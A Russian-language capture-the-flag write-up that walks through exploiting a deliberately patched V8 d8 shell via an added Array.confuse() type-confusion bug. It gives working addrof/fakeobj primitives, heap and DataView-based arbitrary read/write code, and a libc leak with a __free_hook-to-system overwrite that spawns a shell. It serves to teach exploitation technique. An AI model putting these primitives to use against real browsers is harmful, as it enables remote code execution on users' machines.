# E-Corp part 2.
```
Last year, your internship at E-Corp (Evil Corp) ended with a working router RCE exploit. Leadership was very impressed. As a result, we chose to extend a return offer. We used your exploit to get a MiTM position on routers around the world. Now, we want to be able to use that MiTM position to exploit browsers to further our world domination plans! This summer, you will need to exploit Chrome!

One of our vulnerability researchers has discovered a new type confusion bug in Chrome. It turns out, a type confusion can be evoked by calling .confuse() on a PACKED_DOUBLE_ELEMENTS or PACKED_ELEMENTS array. The attached poc.js illustrates an example. You can run it with ./d8 ./poc.js. Once you have an RCE exploit, you will find a file with the flag in the current directory. Good luck and have fun!
```
С самого начала в задании мы получаем `d8` (`V8` developer shell, `V8` - JavaScript движок, используемый в `chromium`), патч, сделанный в движке, `poc.js` с демонстрацией уязвимости, ну и настройки компиляции с докерфайлом, чтобы мы могли сами пересобрать `d8`, если захотим.

Заглянем в файл `patch`:
```c
+// Custom Additions (UTCTF)
+
+BUILTIN(ArrayConfuse) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle<Object> receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Invalid type. Must be a JSArray.")));
+  }
+
+  Handle<JSArray> array = Cast<JSArray>(receiver);
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind == PACKED_ELEMENTS) {
+    DirectHandle<Map> map = JSObject::GetElementsTransitionMap(
+        array, PACKED_DOUBLE_ELEMENTS);
+    {
+      DisallowGarbageCollection no_gc;
+      Tagged<JSArray> raw = *array;
+      raw->set_map(*map, kReleaseStore);
+    }
+  } else if (kind == PACKED_DOUBLE_ELEMENTS) {
+    DirectHandle<Map> map = JSObject::GetElementsTransitionMap(
+        array, PACKED_ELEMENTS);
+    {
+      DisallowGarbageCollection no_gc;
+      Tagged<JSArray> raw = *array;
+      raw->set_map(*map, kReleaseStore);
+    }
+  } else {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Invalid JSArray type. Must be an object or float array.")));
+  }
+
+  return ReadOnlyRoots(isolate).undefined_value();
+}
```
Окей, видим, что здесь добавлен новый метод у `Javascript Array` - `confuse`. Он меняет `Map` у массива `double` на `Map` объектов `JavaScript`. 

Разберем, что такое `Map` и что происходит в патче:

У всех объектов в `JavaScript` есть свой объект типа `Map`, который определяет поведение при попытке обратиться к элементам объекта - например, если объект является массивом, именно `Map` будет отвечать за то, какой объект будет выдан по какому индексу. Или же например `properties` объекта также возвращаются благодаря `Map`. 

Так что же происходит? Если элементы массива распознавались как `double`, то они становятся `object`, и наоборот. Посмотрим, что получится при запуске `poc.js`:
`poc.js`:
```JavaScript
let a = ["hi", "bye"];
console.log(a);
a.confuse();
console.log(a);
a.confuse();
console.log(a);
```
Launch:
```bash
└─$ ./d8 ./poc.js
hi,bye
4.0615614827311173e-308,8.487985289e-314
hi,bye
```
Ага. Вместо строк при выводе массива во второй раз мы получили какие-то `double`-числа. Попробуем их распаковать при помощи библиотеки `struct` в питоне: <br>
`4.0615614827311173e-308` = `0x001d34ad001d349d` <br>
`8.487985289e-314` = `0x00000004000010cd` <br>
Посмотрим, что именно это за числа - в `d8` мы можем выводить информацию об объектах при помощи `%DebugPrint(obj)`, однако для этого надо добавить флаг `--allow-natives-syntax`: <br>
`poc.js`:
```JavaScript
let a = ["hi", "bye"];
%DebugPrint(a);
```
Launch:
```text
└─$ ./d8 --allow-natives-syntax ./poc.js
DebugPrint: 0x1f4200042b4d: [JSArray]
 - map: 0x1f42001cb8ed <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x1f42001cb1c5 <JSArray[0]>
 - elements: 0x1f42001d3535 <FixedArray[2]> [PACKED_ELEMENTS (COW)]
 - length: 2
 - properties: 0x1f4200000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x1f4200000d99: [String] in ReadOnlySpace: #length: 0x1f4200025fed <AccessorInfo name= 0x1f4200000d99 <String[6]: #length>, data= 0x1f4200000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x1f42001d3535 <FixedArray[2]> {
           0: 0x1f42001d349d <String[2]: #hi>
           1: 0x1f42001d34ad <String[3]: #bye>
 }
0x1f42001cb8ed: [Map] in OldSpace
 - map: 0x1f42001c0201 <MetaMap (0x1f42001c0251 <NativeContext[295]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_ELEMENTS
 - enum length: invalid
 - back pointer: 0x1f42001cb8ad <Map[16](HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x1f4200000a89 <Cell value= 1>
 - instance descriptors #1: 0x1f42001cb7f9 <DescriptorArray[1]>
 - transitions #1: 0x1f42001cb915 <TransitionArray[4]>
   Transition array #1:
     0x1f4200000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x1f42001cb92d <Map[16](HOLEY_ELEMENTS)>
 - prototype: 0x1f42001cb1c5 <JSArray[0]>
 - constructor: 0x1f42001caeb1 <JSFunction Array (sfi = 0x1f420002b3c5)>
 - dependent code: 0x1f4200000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```
судя по 
```
 - elements: 0x1f42001d3535 <FixedArray[2]> {
           0: 0x1f42001d349d <String[2]: #hi>
           1: 0x1f42001d34ad <String[3]: #bye>
```
первый `double` (`0x001d34ad001d349d`) вывел нам адреса строк, но что с ними? 32 бита совпадают, но где полные указатели?

Дело в том, что c [2020 года](https://stackoverflow.com/questions/73777790/how-v8-encodes-pointers-in-memory) в `v8` реализовано сжатие указателей - все указатели на `heap` представляют из себя 32-битное число, а при обращении по ним к ним добавляются оставшиеся 32 бита от адреса кучи, сохраненные при запуске программы. Т.е.:

Есть указатель `0x1f42001d349d`. При запуске программа сохраняет высшие 32 бита: `0x1f4200000000` и кладет на кучу нижние 32 бита: `0x001d349d`. При попытке чтения с указателя с кучи `0x001d349d` к нему прибавится сохраненная часть `0x1f4200000000` и мы получим полный указатель `0x1f42001d349d`.

Проблема эксплуатации в том, что получив `Arbitrary Read` (чтение по произвольному адресу)/`Arbitrary Write`(запись по произвольному адресу) мы сможем писать только на хипе `v8`, так как нормального способа получить верхние 32 бита нет. Но для начала напишем функции, упрощающие эксплуатацию, и получим стандартные примитивы:

## Функции, упрощающие эксплуатацию
```javascript
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = double
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```
Эти две функции превращают `double` в `BigInt` и наоборот.

## Получение стандартных примитивов
В эксплуатации `v8` есть понятие стандартных примитивов - `addrof(obj)` и `fakeobj(addr)`. 
- `addrof(obj)` - получение адреса переданного объекта
- `fakeobj(addr)` - получение объекта по переданному адресу

Реализуем их!
### addrof
```javascript
function leak_all_addrof(obj) {
    let a = [obj];
    a.confuse();
    let leak = ftoi(a.at(0));
    // Верхние 32 бита могут пригодиться
    return [(leak & 0xffffffff00000000n) >> 32n, leak & 0xffffffffn] 
}

function addrof(obj) {
    // Указатель на объект всегда будет нижними 32 битами
    return leak_all_addrof(obj)[1]
}
```
Пояснение: массив объектов по факту является массивом указателей на объекты, что позволяет нам ликнуть указатель на объект, вытащив его как `double`.

### fakeobj
```javascript
function fakeobj(addr) {
    let array = [itof(addr)];
    array.confuse();
    let fake_object = array[0];
    return fake_object;
}
```
Пояснение: ситуация наоборот - добавляем в массив наш адрес, представленный как `double`, и заставляем массив думать, что это указатель на какой-то объект. После чего вытаскиваем этот объект из массива.

Отлично! Стандартные примитивы получены, теперь надо получить AR (Arbitrary Read) и AW (Arbitrary Write). Из-за сжатия указателей мы сначала получим эти примитивы, работающие только на хипе `v8`, и после этого уже получим эти же примитивы по всему адресному пространству.

## Получение AR/AW на heap
Для начала нам надо разобраться, как именно мы хотим читать и писать на хипе. 
Для этого поговорим о типах в `JavaScript`. 

В `JavaScript` существует всего 3 типа - `smallint`, `double`, `Object`. Собственно абсолютно все используемые типы в самом `JS` относятся к одному из этих типов.
1) `smallint` - обычное число, размер которого на 64-битной системе - [-2^31, 2^31-1]
2) `double` - 64-битное число с плавающей точкой
3) `Object` - тип, от которого наследуются все остальные типы (`Array`, `BigInt` и т.д.)

В нашем случае проще всего манипулировать именно `double array`, так как числа 64-битные и мы уже написали под них помогающие функции. Идея эксплуатации следующая - мы создадим при помощи примитива `fakeobj` ненастоящий массив даблов, в котором сможем контролировать указатель на место, где хранятся значения, и таким образом обращаясь по индексу 0 сможем записывать и читать значения с любого места на куче.

Для этого вновь вернемся к `%DebugPrint` и рассмотрим память в отладчике `gdb`.
Для того, чтобы выполнение не прерывалось после выполнения `poc.js` добавим еще один флаг - `--shell`, который откроет интерактивный шелл после исполнения файла.
```bash
└─$ gdb ./d8
GNU gdb (Debian 16.1-2) 16.1
pwndbg> run --allow-natives-syntax --shell poc.js
DebugPrint: 0x22f200042b2d: [JSArray]
 - map: 0x22f2001cb8ed <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x22f2001cb1c5 <JSArray[0]>
 - elements: 0x22f2001d3535 <FixedArray[2]> [PACKED_ELEMENTS (COW)]
 - length: 2
 - properties: 0x22f200000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x22f200000d99: [String] in ReadOnlySpace: #length: 0x22f200025fed <AccessorInfo name= 0x22f200000d99 <String[6]: #length>, data= 0x22f200000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x22f2001d3535 <FixedArray[2]> {
           0: 0x22f2001d349d <String[2]: #hi>
           1: 0x22f2001d34ad <String[3]: #bye>
 }
0x22f2001cb8ed: [Map] in OldSpace
 - map: 0x22f2001c0201 <MetaMap (0x22f2001c0251 <NativeContext[295]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_ELEMENTS
 - enum length: invalid
 - back pointer: 0x22f2001cb8ad <Map[16](HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x22f200000a89 <Cell value= 1>
 - instance descriptors #1: 0x22f2001cb7f9 <DescriptorArray[1]>
 - transitions #1: 0x22f2001cb915 <TransitionArray[4]>
   Transition array #1:
     0x22f200000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x22f2001cb92d <Map[16](HOLEY_ELEMENTS)>
 - prototype: 0x22f2001cb1c5 <JSArray[0]>
 - constructor: 0x22f2001caeb1 <JSFunction Array (sfi = 0x22f20002b3c5)>
 - dependent code: 0x22f200000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```
Посмотрим, какие хранятся указатели по адресу нашего массива строк:
```
pwndbg> x/10gx  0x22f200042b2d
0x22f200042b2d: 0x3500000725001cb8      0x6d00000004001d35
0x22f200042b3d: 0x4100000004000005      0x6d00000741000007
0x22f200042b4d: 0x9d00000004000005      0x0d001d34ad001d34
0x22f200042b5d: 0x0600000003000001      0x79622c6968000000
0x22f200042b6d: 0x040000056d000065      0x19001d35f5000000
```
Еще один неприятный момент - при просмотре адресов в дебаггере надо всегда вычитать 1 байт, чтобы увидеть реальные значения. К тому же будет проще смотреть на числа в 32-битном представлении (из-за сжатия указателей)
```
pwndbg> x/8wx  0x22f200042b2d-1
0x22f200042b2c: 0x001cb8ed      0x00000725      0x001d3535      0x00000004
0x22f200042b3c: 0x0000056d      0x00000004      0x00000741      0x00000741
```
Видим указатель на `Map` - `0x001cb8ed`, далее идет ссылка на массив `properties` - `0x00000725`, а далее идет указатель на массив элементов - `0x001d3535`, после которого идет количество элементов (2 из них системные, а следующие 2 - указатели на строки). Посмотрим на эти элементы:
```
pwndbg> x/4wx 0x22f2001d3535-1
0x22f2001d3534: 0x0000065d      0x00000004      0x001d349d      0x001d34ad
```
Хорошо, а если будет массив double'ов? Перепишем `poc.js`:
```javascript
let a = [1.1, 2.2];
%DebugPrint(a);
```
```
pwndbg> run --allow-natives-syntax --shell poc.js
DebugPrint: 0x3d7b00042af5: [JSArray]
 - map: 0x3d7b001cb86d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3d7b001cb1c5 <JSArray[0]>
 - elements: 0x3d7b00042add <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x3d7b00000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3d7b00000d99: [String] in ReadOnlySpace: #length: 0x3d7b00025fed <AccessorInfo name= 0x3d7b00000d99 <String[6]: #length>, data= 0x3d7b00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x3d7b00042add <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
0x3d7b001cb86d: [Map] in OldSpace
 - map: 0x3d7b001c0201 <MetaMap (0x3d7b001c0251 <NativeContext[295]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x3d7b001cb82d <Map[16](HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x3d7b00000a89 <Cell value= 1>
 - instance descriptors #1: 0x3d7b001cb7f9 <DescriptorArray[1]>
 - transitions #1: 0x3d7b001cb895 <TransitionArray[4]>
   Transition array #1:
     0x3d7b00000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3d7b001cb8ad <Map[16](HOLEY_DOUBLE_ELEMENTS)>
 - prototype: 0x3d7b001cb1c5 <JSArray[0]>
 - constructor: 0x3d7b001caeb1 <JSFunction Array (sfi = 0x3d7b0002b3c5)>
 - dependent code: 0x3d7b00000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```
Смотрим на элементы:
```
pwndbg> x/4gx 0x3d7b00042add-1
0x3d7b00042adc: 0x00000004000008a9      0x3ff199999999999a
0x3d7b00042aec: 0x400199999999999a      0x00000725001cb86d
```
А вот и наши double! Они уже занимают 64 бита, однако тоже начинаются спустя 2 сервисных элемента.

Отлично, теперь для создания ненастоящего объекта нам осталось получить адрес `Map` массива `double`. Вызовем функцию `leak_all_addrof` на наш массив `a`:
```
d8> leak_all_addrof(a)
[1882221n, 274561n]
d8> leak_all_addrof(a).map(obj => obj.toString(16))
["1cb86d", "43081"]
```
Повезло! По нулевому индексу лежит адрес объекта `Map` массива `double`! Проверим, точно ли это тот адрес (`0x1cb86d`):
```
d8> %DebugPrint(a)
DebugPrint: 0x51a00043081: [JSArray]
 - map: 0x051a001cb86d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - ...
```
Да! Мы получили адрес нужного нам `Map`!

## Получение примитивов `AR`/`AW`
Для начала напишем функцию, создающую ненастоящий объект при помощи массива `double'ов`, но для этого нам надо рассчитать оффсет, по которому элементы лежат относительно самого списка:
```javascript
function create_fake_object(elements_addr, map) {
    // elements must start on 8 byte earlier (2 system variables)
    let elements_start_addr = elements_addr - 0x8n;
    // Bit operations are required because of pointer compression
    let obj = [itof((0x725n << 32n) | (map)), itof((4n << 32n) | (elements_start_addr))];
    %DebugPrint(obj);
    console.log(`[*] Addr of obj: ${addrof(obj).toString(16)}`);
    return obj;
}

let fake_obj1 = create_fake_object(addrof(a), 0xffffn);
```
Output:
```txt
DebugPrint: 0x355a00043301: [JSArray]
 - map: 0x355a001cb86d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x355a001cb1c5 <JSArray[0]>
 - elements: 0x355a0004335d <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x355a00000725 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x355a00000d99: [String] in ReadOnlySpace: #length: 0x355a00025fed <AccessorInfo name= 0x355a00000d99 <String[6]: #length>, data= 0x355a00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x355a0004335d <FixedDoubleArray[2]> {
           0: 3.88113e-311
           1: 8.48812e-314
 }
...

[*] Addr of obj: 43301
```
Ага, функция `addrof` работает как и должна, рассчитаем оффсет объектов:
```
pwndbg> x/8wx 0x355a0004335d-1
0x355a0004335c: 0x000008a9      0x00000004      0x0000ffff      0x00000725
0x355a0004336c: 0x00043219      0x00000004      0x00000831      0x00000002
```
```python
>>> hex(0x355a0004335d + 8 - 0x355a00043301)
'0x64'
```
А значит, прибавив 0x64 к адресу объекта, мы должны получить адрес наших элементов:
```
pwndbg> x/4wx 0x355a00043301+0x64-1
0x355a00043364: 0x0000ffff      0x00000725      0x00043219      0x00000004
```
Отлично! Допишем функцию и протестируем ее:
```javascript
function create_fake_object(addr) {
    // elements must start on 8 byte earlier (2 system variables)
    let elements_start_addr = addr - 0x8n;
    // Bit operations are required because of pointer compression
    let obj = [itof((0x725n << 32n) | (map)), itof((4n << 32n) | (elements_start_addr))];
    let elements_addr = addrof(obj) + 0x64n;
    return fakeobj(elements_addr);
}

let a = [1.1, 2.2];
var map = leak_all_addrof(a)[0];
console.log(`[+] Map: ${map.toString(16)}`);
%DebugPrint(a);

console.log(`[+] Addr of a: ${addrof(a).toString(16)}`);
let fake_obj1 = create_fake_object(map);
console.log(`[+] ${ftoi(fake_obj1.at(0)).toString(16)}`);
```
Output:
```
[+] Map: 1cb86d
DebugPrint: 0x17cd000431f9: [JSArray]
 - map: 0x17cd001cb86d <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
...

[+] Addr of a: 431f9
[+] 31040404001c0201
```
Сравним с реальными данными:
```
pwndbg> x/gx 0x17cd001cb86d-1
0x17cd001cb86c: 0x31040404001c0201
```
Отлично! Все работает!

Допишем функцию, которая будет возвращать нам 64-битное число по адресу:
```javascript

function initial_arbitrary_read(addr) {
    let obj = create_fake_object(addr)
    return ftoi(obj[0])
}

let a = [1.1, 2.2];
var map = leak_all_addrof(a)[0];
console.log(`[+] Map: ${map.toString(16)}`);
%DebugPrint(a);

console.log(`[+] Addr of a: ${addrof(a).toString(16)}`);
console.log(`[+] ${initial_arbitrary_read(map).toString(16)}`);
```
Output:
```
[+] Addr of a: 432bd
[+] 31040404001c0201
```
Работает! 
Теперь можно написать `AW` - просто изменять элемент по индексу 0:
```javascript
function initial_arbitrary_write(addr, value) {
    let obj = create_fake_object(addr)
    obj[0] = itof(value)
}
```
Протестируем:
```javascript
let a = [1.1, 2.2];
var map = leak_all_addrof(a)[0];
console.log(`[+] Map: ${map.toString(16)}`);

console.log(`[+] ${initial_arbitrary_read(addrof(a)).toString(16)}`);

initial_arbitrary_write(addrof(a), 0xffffffffffn)
console.log(`[+] ${initial_arbitrary_read(addrof(a)).toString(16)}`);
```
Output:
```
[+] Map: 1cb86d
[+] 725001cb86d
[+] ffffffffff
```
Отлично! Теперь надо получить возможность писать за грань кучи.
## AR/AW по всему адресному пространству
Этот способ я подсмотрел в [этом райтапе](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/), суть в том, что изменяя у класса `DataView` указатель `backing_store` мы можем писать и читать по любому адресу. Для начала надо рассчитать, где лежит этот поинтер в нашей версии:
```javascript
var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);
var buf_addr = addrof(buf);
%DebugPrint(buf)
```
Output:
```
DebugPrint: 0xd3000043475: [JSArrayBuffer]
 - map: 0x0d30001c87b9 <Map[56](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0d30001c894d <Object map = 0xd30001c87e1>
 - elements: 0x0d3000000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - cpp_heap_wrappable: 0
 - backing_store: 0x555557f4d2c0
...
```
Заходим в `gdb` и ищем:
```
pwndbg> x/16wx 0xd3000043475-1
0xd3000043474:  0x001c87b9      0x00000725      0x00000725      0x00000000
0xd3000043484:  0x00000069      0x00000008      0x00000000      0x00000008
0xd3000043494:  0x00000000      0x57f4d2c0      0x00005555      0x00080040
0xd30000434a4:  0x00000069      0x00000002      0x001c6089      0x00000725
```
Поинтер находится по оффсету 0x24 - `0x57f4d2c0      0x00005555`
Окей, которая перепишем это место и проверим, сработало ли:
```javascript
var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);
var buf_addr = addrof(buf);
initial_arbitrary_write(addrof(buf) + 0x24n, 0x1234567890n);
%DebugPrint(buf)
```
Output:
```
[+] Map: 1cb86d
DebugPrint: 0x411000434b1: [JSArrayBuffer]
 - map: 0x0411001c87b9 <Map[56](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0411001c894d <Object map = 0x411001c87e1>
 - elements: 0x041100000725 <FixedArray[0]> [HOLEY_ELEMENTS]
 - cpp_heap_wrappable: 0
 - backing_store: 0x1234567890
```
Отлично! Напишем функции и попробуем что-нибудь считать со стэка например:
```javascript
function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let backing_store_addr = addrof(buf) + 0x24n;
    initial_arbitrary_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

function arb_read(addr) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let backing_store_addr = addrof(buf) + 0x24n;
    initial_arbitrary_write(backing_store_addr, addr);
    return dataview.getBigUint64(0, true);
}
```
Запустим `d8` и подсунем в функцию какой-нибудь адрес:
```
pwndbg> x/gx 0x32ae00000000
0x32ae00000000: 0x0000000000040940
```
```
d8> arb_read(0x32ae00000000n).toString(16)
"40940"
```
Отлично! Осталось дело за малым - эскалировать примитивы в RCE:
## Получение RCE
Будем подменять `__free_hook` на `system` - таким образом при вызове `free` (который мы можем затриггерить например при помощи `console.log("smth")`) будет вызываться `system` на контент, который пытался зачиститься.

Для начала похитим адрес хипа:
```javascript
var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);

let heap_addr = initial_arbitrary_read(addrof(buf) + 36n);
console.log(`[*] heap addr: ${heap_addr.toString(16)}`);
```
Output:
```
[+] Map: 1cb86d
[*] heap addr: 555557f482c0
```
Посмотрим, что интересного можно найти около этого адреса:
```
pwndbg> telescope 0x555557f482c0 0x110
00:0000│     0x555557f482c0 ◂— 0
... ↓        2 skipped
108:0840│     0x555557f48b00 —▸ 0x7ffff7e7b250 (main_arena+1936) —▸ 0x7ffff7e7b240 (main_arena+1920) —▸ 0x555557f44250 ◂— 0
109:0848│     0x555557f48b08 —▸ 0x7ffff7e7b250 (main_arena+1936) —▸ 0x7ffff7e7b240 (main_arena+1920) —▸ 0x555557f44250 ◂— 0
```
Мы можем похитить адрес либсы:
```
pwndbg> vmmap 0x7ffff7e7b250
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7e76000     0x7ffff7e7a000 r--p     4000 1e2000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7ffff7e7a000     0x7ffff7e7c000 rw-p     2000 1e6000 /usr/lib/x86_64-linux-gnu/libc.so.6 +0x1250
    0x7ffff7e7c000     0x7ffff7e89000 rw-p     d000      0 [anon_7ffff7e7c]
```
Получим адрес:
```
let heap_addr = initial_arbitrary_read(backing_store_addr);
console.log(`[+] Heap addr leaked: ${heap_addr.toString(16)}`)

main_arena_addr = arb_read(heap_addr + 0x840n) - 0x1250n
console.log(`[+] Main arena addr leaked: ${main_arena_addr.toString(16)}`)

libc_addr = main_arena_addr - 0x1e7000n
console.log(`[+] Libc addr leaked: ${libc_addr.toString(16)}`)
```
Output:
```
[+] Map: 1cb86d
[*] backing store addr: 437f5
[+] Heap addr leaked: 555557f482c0
[+] Main arena addr leaked: 7ffff7e7a000
[+] Libc addr leaked: 7ffff7c93000
```
Рассчитаем оффсеты `__free_hook` и `system` на моей либсе (для сервера можно поднять докер и перерассчитать на либсе оттуда)
```
pwndbg> p &__free_hook
$1 = (void (**)(void *, const void *)) 0x7ffff7e81148 <__free_hook>
pwndbg> p &system
$2 = (int (*)(const char *)) 0x7ffff7ce58f0 <__libc_system>
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
...
    0x7ffff7c93000     0x7ffff7cbb000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
...
```
Рассчитываем:
```python
>>> hex(0x7ffff7ce58f0 - 0x7ffff7c93000)
'0x528f0'
>>> hex(0x7ffff7e81148 - 0x7ffff7c93000)
'0x1ee148'
```
Получаем, что:
1) `system` = `0x528f0`
2) `__free_hook` = `0x1ee148`

Переписываем и триггерим `free` со строкой `/bin/sh`:
```javascript
let heap_addr = initial_arbitrary_read(backing_store_addr);
console.log(`[+] Heap addr leaked: ${heap_addr.toString(16)}`)

main_arena_addr = arb_read(heap_addr + 0x840n) - 0x1250n
console.log(`[+] Main arena addr leaked: ${main_arena_addr.toString(16)}`)

libc_addr = main_arena_addr - 0x1e7000n
console.log(`[+] Libc addr leaked: ${libc_addr.toString(16)}`)

arb_write(libc_addr + 0x1ee148n, libc_addr + 0x528f0n)
console.log("/bin/sh\x00")
```
Output:
```
[+] Map: 1cb86d
[*] backing store addr: 437f9
[+] Heap addr leaked: 555557f482c0
[+] Main arena addr leaked: 7ffff7e7a000
[+] Libc addr leaked: 7ffff7c93000
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
echo "DONE!"
DONE!
```